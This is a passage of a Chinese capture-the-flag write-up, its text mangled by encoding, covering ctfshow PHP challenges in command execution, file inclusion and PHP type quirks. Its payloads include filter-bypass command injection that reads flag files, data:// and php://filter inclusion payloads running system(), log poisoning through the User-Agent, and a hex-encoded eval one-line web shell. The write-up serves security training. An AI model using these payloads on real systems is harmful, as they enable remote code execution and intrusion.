align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;        &#125;        else&#123;        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;        &#125;    &#125;    else&#123;     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>ç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œå¤šè¿‡æ»¤äº†ä¸€ä¸ªSHLVLï¼Œé‚£å°±ç”¨#?ä»£æ›¿</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code></pre><p>ç›¸å½“äº</p><p>/bin/bash64 flag.php</p><p>æˆ–è€…</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???&#x2F;bin&#x2F;rev</code></pre><h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;code&#39;]))&#123;    $code&#x3D;$_POST[&#39;code&#39;];    if(!preg_match(&#39;&#x2F;\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\&#x2F;|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\&#x3D;|\^|\*|\x26|#|%|\&gt;|\&#39;|\&quot;|\&#96;|\||\,&#x2F;&#39;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;;        &#125;        else&#123;        echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;;        &#125;    &#125;    else&#123;     echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;;    &#125;&#125;?&gt;</code></pre><p>payload</p><blockquote><p>é€šè¿‡$?æ¥å®ç°çš„ï¼Œ$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯</p></blockquote><pre class="language-none"><code class="language-none">code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? *#å¯èƒ½å­˜åœ¨æˆåŠŸçš„æœºä¼šï¼Œä¸æ–­åˆ·æ–°*</code></pre><h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: æ”¶é›†è‡ªç½‘ç»œ# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125;</code></pre><p>ä¸èƒ½æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œä¸èƒ½æœ‰é™¤whitelisté‡Œé¢çš„å­—æ¯ï¼Œå¤§æ¦‚æ€è·¯å°±æ˜¯åˆ©ç”¨è¿›åˆ¶è½¬æ¢ä»¥æ•°å­—æ„é€ å­—æ¯<br>é¢˜ä¸­å¯ç”¨çš„è¿›åˆ¶è½¬æ¢å‡½æ•°ï¼š<code>&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;</code></p><pre class="language-none"><code class="language-none">$_GET[abs]($_GET[acos])&#x2F;&#x2F;strlen($content) &gt;&#x3D; 80ï¼Œæœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨getå‘½ä»¤æ‰§è¡Œâ†“$_GET&#123;abs&#125;($_GET&#123;acos&#125;)&#x2F;&#x2F;[]åœ¨é»‘åå•ï¼Œç”¨&#123;&#125;ä»£æ›¿â†“$pi&#x3D;_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;)â†“è¿›åˆ¶è½¬æ¢base_convert(number,frombase,tobase)ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—dechex()ï¼šæŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°hex2bin()ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œè¿”å› ASCII å­—ç¬¦æœ€é‡è¦çš„æ˜¯hex2binå‡½æ•°ï¼Œä½†æ˜¯ä¸åœ¨ç™½åå•é‡Œé¢base_convertæ„é€ hex2binï¼ˆæˆ‘æƒ³ç”¨base_convertç›´æ¥è½¬_GETï¼Œä½†æ˜¯åªèƒ½å¾—åˆ°getï¼‰base_convert(&#39;hex2bin&#39;,36,10)â†’37907361743_GETâ†’  hexåå…­è¿›åˆ¶ 5f474554 (ä¸èƒ½æœ‰å­—æ¯æ‰€ä»¥åå…­è¿›åˆ¶ä¸è¡Œ) â†’  decåè¿›åˆ¶ 1598506324(åœ¨çº¿è½¬æ¢)æ‰€ä»¥_GETå¯ä»¥å†™ä¸ºhex2bin(dechex(1598506324))â†“base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324))æœ€åçš„payload?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;ls?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;cat *</code></pre><p>payload1ï¼š</p><pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) æ·»åŠ å¤´éƒ¨ä¿¡æ¯ï¼š1&#x3D;tac flag.php</code></pre><p>payload2ï¼š</p><pre class="language-none"><code class="language-none">?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs&#x3D;system&amp;acos&#x3D;tac flag.php</code></pre><h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</code></pre><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>é¢˜ç›®ï¼š</p><pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>å°†phpæ›¿æ¢æˆäº†???,è€ƒè™‘ä½¿ç”¨dataåè®®è¿›è¡Œbase64è§£ç ã€‚<br><strong>payload</strong></p><pre class="language-none"><code class="language-none">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</code></pre><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>é¢˜ç›®ï¼š</p><pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>dataä¹Ÿç¦ç”¨äº†ï¼Œå°è¯•æ—¥å¿—æ³¨å…¥æ”»å‡»ã€‚<br>æ—¥å¿—çš„ä½ç½®ï¼Œ/var/log/nginx/access.logã€‚<br>åœ¨user-agentçš„ä½ç½®ï¼Œé¦–å…ˆ<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>ï¼Œåˆ—å‡ºæ¥æ–‡ä»¶ã€‚<br>ä¹‹åè¯»ç›®æ ‡æ–‡ä»¶ï¼Œ<code>&lt;?php system(&#39;cat fl0g.php&#39;); ?&gt;</code></p><p>è¿˜å¯ä»¥ç›´æ¥å†™é©¬</p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>é¢˜ç›®ï¼š</p><pre class="language-none"><code class="language-none">if(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;</code></pre><p>è¿‡æ»¤äº†phpã€dataã€:ï¼Œå°è¯•ä¸Šé¢˜æ–¹æ³•ï¼Œ<br>åŒä¸Šé¢˜</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p><p>åˆ©ç”¨php://filterçš„ç¼–ç æ¥ä½¿ç»“æŸçš„ä»£ç å¤±æ•ˆ</p><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p>dataåè®®</p><p>data://text/plain;base64,poc</p><pre class="language-php" data-language="php"><code class="language-php">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwqJyk7</code></pre><h2 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h2><p>è¿˜æ˜¯åˆ©ç”¨php://filterçš„ç¼–ç æ¥ä½¿ç»“æŸçš„ä»£ç å¤±æ•ˆ</p><p>**convert.iconv.**è¿™ä¸ªè¿‡æ»¤å™¨è¿˜æ˜¯ç”¨çš„ã€‚</p><p>ucs-2 å’Œucs-4éƒ½èƒ½ç”¨ã€‚</p><p>ucs-2 äºŒä½ä¸€åè½¬ï¼Œå­—ç¬¦ä¸ªæ•°è¦åœ¨å¶æ•°ä½ä¸Šï¼Œucs-4 å››ä½ä¸€åè½¬ï¼Œå­—ç¬¦ä¸ªæ•°è¦æ˜¯4çš„å€æ•°ã€‚ä½æ•°å¥½æ§åˆ¶ï¼Œå‚æ•°æ”¹æ”¹é•¿åº¦å°±è¡Œäº†ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200136309.png" alt="image-20220505200136309"></p><pre class="language-php" data-language="php"><code class="language-php"> file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200318190.png" alt="image-20220505200318190"></p><h1 id="phpç‰¹æ€§"><a href="#phpç‰¹æ€§" class="headerlink" title="phpç‰¹æ€§"></a>phpç‰¹æ€§</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>æ•°ç»„ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200639134.png" alt="image-20220505200639134"></p><p>intval()â€“éç©ºçš„æ•°ç»„ä¼šè¿”å›1ï¼Œå¯ä»¥é‡‡ç”¨æ•°ç»„ç»•è¿‡intval()å‡½æ•°</p><p><strong>preg_match()</strong></p><p>è¿”å›çš„åŒ¹é…æ¬¡æ•°ï¼Œä¸åŒ¹é…ä¸º0ï¼ŒåŒ¹é…æˆåŠŸ1æ¬¡å³ä¸º1ï¼Œç„¶ååœæ­¢æœç´¢ï¼Œ<strong>è¯¥å‡½æ•°åªä¼šåŒ¹é…ä¸€è¡Œï¼Œå¯ä»¥%0aæ¢è¡Œç»•è¿‡</strong></p><p>preg_match_all()ä¸åŒäºæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢ ç›´åˆ°åˆ°è¾¾ç»“å°¾ã€‚ å¦‚æœå‘ç”Ÿé”™è¯¯preg_match()è¿”å› FALSEã€‚</p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505200839032.png" alt="image-20220505200839032"></p><p>åŠ ä¸ªå¤§äºå·ï¼Œæˆ–è€…è½¬æˆå…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶</p><p>intvalæ”¯æŒä¸åŒè¿›åˆ¶ï¼Œè¿™é‡ŒbaseæŒ‡å®šæ˜¯0ï¼Œé‚£ä¹ˆintvalä¼šæ ¹æ®æˆ‘ä»¬è¾“å…¥æƒ…å†µä½¿ç”¨è¿›åˆ¶</p><p>intvalå–çš„æ˜¯æˆ‘ä»¬æ‰€è¾“å…¥å†…å®¹å¼€å¤´çš„æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥å«æœ‰å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚?num=4476a,é‚£ä¹ˆintval(â€œ4476aâ€)ä¹Ÿç­‰äº4476</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><blockquote><p>/m è¡¨ç¤ºå¤šè¡ŒåŒ¹é…ï¼ŒåŒ¹é…æ¢è¡Œç¬¦ä¸¤ç«¯çš„æ½œåœ¨åŒ¹é…ã€‚å½±å“æ­£åˆ™ä¸­çš„^$ç¬¦å·</p></blockquote><p>å¤šè¡ŒåŒ¹é…å¯ä»¥é€šè¿‡%0aï¼ˆå›è½¦é”®ï¼‰ç»•è¿‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505201235224.png" alt="image-20220505201235224"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;</code></pre><p>è¿›åˆ¶è½¬æ¢æˆ–è€…ç”¨eæ¥å½“ä½œç§‘å­¦è®¡æ•°æ³•</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p>è¿‡æ»¤äº†å­—æ¯ï¼Œç”¨å…«è¿›åˆ¶</p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p>strpos($num, â€œ0â€)</p><p>strpos()å‡½æ•°çš„ç†è§£ï¼šè¯¥å‡½æ•°æ˜¯ä»æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°numä¸­ï¼Œå¯»æ‰¾å¹¶åŒ¹é…æ•°å­—0ï¼Œç¬¬ä¸€ä½åŒ¹é…æ­£ç¡®è¿”å›0ï¼Œç¬¬äºŒä½åŒ¹é…æ­£ç¡®è¿”å›1ï¼Œä»¥åé€’æ¨ï¼Œæ‰€ä»¥åœ¨é¢˜ä¸­å³ä¸ºåªè¦åŒ¹é…åˆ°ï¼Œè¾“å‡ºå°±ä¸ºtrueï¼Œå–åå°±ä¸ºfalse.æ‰€ä»¥å¯ä»¥é€šè¿‡é™¤äº†ç¬¬ä¸€ä½å…¶ä»–ä½å‡ºç°0çš„æ–¹æ³•è®©ifæ¡ä»¶ä¸ºå‡ã€‚<strong>è¯¥å‡½æ•°å¹¶ä¸æ˜¯åªåŒ¹é…ä¸€è¡Œæ•°æ®ã€‚å›è½¦ååŒ¹é…ä»æœ‰æ•ˆã€‚</strong>å¯ä»¥é€šè¿‡?num=%0a4476ç»•è¿‡</p><p>åªè¦0ä¸åœ¨ç¬¬ä¸€ä½å°±è¡Œï¼ˆä½†æ˜¯å¿…é¡»æœ‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å…«è¿›åˆ¶å¸¦åŠ å·+010574ï¼Œæˆ–è€…æ”¾åœ¨å°æ•°ç‚¹ä¸Š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505202027037.png" alt="image-20220505202027037"></p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    if($num&#x3D;&#x3D;4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;&#x2F;[a-z]|\.&#x2F;i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123;        echo $flag;    &#125;&#125;</code></pre><p>ç¬¬ä¸€ä¸ªifæ˜¯å¼±æ¯”è¾ƒï¼Œåªèƒ½è¿›åˆ¶è½¬æ¢</p><p>åè¾¹çš„strposå¯ä»¥éœ€è¦åœ¨è½¬æ¢äº†è¿›åˆ¶çš„æ•°å­—å‰åŠ ç‚¹ä¸å½±å“å¤§å°çš„ä¸œè¥¿æ¯”å¦‚å›è½¦æ¢è¡Œç©ºæ ¼åŠ å·</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505202339569.png" alt="image-20220505202339569"></p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505203100601.png" alt="image-20220505203100601"></p><p>ç›¸å¯¹è·¯å¾„ç»•è¿‡</p><p>æˆ–è€…ä¼ªåè®®</p><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505203319823.png" alt="image-20220505203319823"></p><p>md5å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›null</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p><a href="https://www.php.cn/php-notebook-172859.html">https://www.php.cn/php-notebook-172859.html</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a></p><pre class="language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);#æœ¬phpæ–‡æ¡£åŒ…å«äº†ä¸€ä¸ªflag.phpæ–‡ä»¶ï¼Œæ˜¯æˆ‘ä»¬æƒ³è¦çš„flag$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;#$_GETå­˜åœ¨ï¼Œåˆ™_GET&#x3D;&amp;$_POSTå¦åˆ™$_GETå€¼ä¸º&#39;flagâ€˜$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;#ä¸­é—´ä¸¤è¡Œä»£ç çœ‹èµ·æ¥è²Œä¼¼æ²¡ç”¨$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);#å¦‚æœgetä¼ å‚äº†HTTP_FLAG&#x3D;flagï¼Œå°±highlight_file($flag)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505204205363.png" alt="image-20220505204205363"></p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$allow &#x3D; array();for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#125;</code></pre><p>in_array()<br>in_array(search,array,type)</p><p>searchâ€”å¿…é¡»ï¼Œè§„å®šåœ¨æ•°ç»„ä¸­æœç´¢çš„å€¼</p><p>arrayâ€”å¿…éœ€ï¼Œè§„å®šæœç´¢çš„æ•°ç»„</p><p>typeâ€”å¯é€‰ï¼Œå¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</p><p>å¦‚æœè®¾ç½®äº†ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‡½æ•°åªæœ‰åœ¨å…ƒç´ å­˜åœ¨äºæ•°ç»„ä¸­ä¸”æ•°æ®ç±»å‹ä¸ç»™å®šå€¼ç›¸åŒæ—¶æ‰è¿”å› trueã€‚</p><p>è€Œé¢˜ä¸­æ²¡æœ‰è®¾ç½®ï¼Œè¿™é‡Œå¯ä»¥é»˜è®¤æ²¡æœ‰è®¾ç½®ï¼Œå³åªæ˜¯å¼±ç±»å‹åŒ¹é…</p><p>åˆ©ç”¨äº†in_arrayçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205056630.png" alt="image-20220505205056630"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205136351.png" alt="image-20220505205136351"></p><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flag in class ctfshow;$ctfshow &#x3D; new ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v2))&#123;        if(preg_match(&quot;&#x2F;\;&#x2F;&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;    &#125;</code></pre><p>è¿™é‡Œè¦çœ‹è¿ç®—ä¼˜å…ˆçº§</p><p>é€»è¾‘è¿ç®—ç¬¦&gt;é€»è¾‘è¿ç®—ï¼ˆèµ‹å€¼ï¼‰&gt;andã€or</p><p>v0çš„å–å€¼åªå’Œv1æœ‰å…³ã€‚v1å‚æ•°ä¸ºæ•°å­—ï¼Œæ²¡æœ‰å…¶ä»–é™åˆ¶ï¼Œä½†æ˜¯v2ä¸èƒ½æœ‰ï¼›æ ‡å¿—ï¼Œv3å¿…é¡»æœ‰ï¼›</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505205701221.png" alt="image-20220505205701221"></p><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505210313073.png" alt="image-20220505210313073"></p><p>åˆ©ç”¨åå°„ç±»è¯»</p><h2 id="web102-103"><a href="#web102-103" class="headerlink" title="web102-103"></a>web102-103</h2><p><strong>call_user_func()</strong></p><p>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‚æ•°è°ƒç”¨</p><p>æœ¬é¢˜ä¸­è¦æ±‚v2æ˜¯æ•°å­—ï¼Œç„¶åé€šè¿‡substrå‡½æ•°æˆªå–v2çš„ç¬¬ä¸‰ä½å¼€å§‹çš„æ•°æ®ï¼ŒåŠä»¥åçš„æ•°æ®ã€‚v1ã€v3é¢˜ä¸­æ²¡æœ‰é™åˆ¶ï¼Œ</p><p><strong>is_numerc()</strong></p><p>è¯¥å‡½æ•°åœ¨php5ç‰ˆæœ¬ä¸‹æœ‰æ¼æ´ï¼Œå¯ä»¥è¯†åˆ«åå…­è¿›åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥å°†ä¸€å¥è¯æœ¨é©¬å†™ä½œåå…­è¿›åˆ¶çš„æ ¼å¼</p><p>æ•…æ„é€ <code>v2=(&lt;?php eval($_REQUEST[a]);?&gt;)</code></p><p>v2=3c3f706870206576616c28245f524551554553545b615d293b3f3e</p><p>v1å¯ä»¥åˆ©ç”¨hex2bin()å‡½æ•°æ¥è¿›è¡ŒæŠŠåå…­è¿›åˆ¶å­—ç¬¦è½¬æ¢æˆASCIIå­—ç¬¦ï¼Œå³æˆ‘ä»¬æƒ³è¦çš„ä¸€å¥è¯æœ¨é©¬ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220505210803363.png" alt="image-20220505210803363"></p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">get:v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.phppost:v1&#x3D;hex2bin</code></pre><p>web103è¿‡æ»¤äº†phpä½†æ˜¯è¿™é‡Œçš„v2ç”¨çš„æ˜¯çŸ­æ ‡ç­¾</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;    $v1 &#x3D; $_POST[&#39;v1&#39;];    $v2 &#x3D; 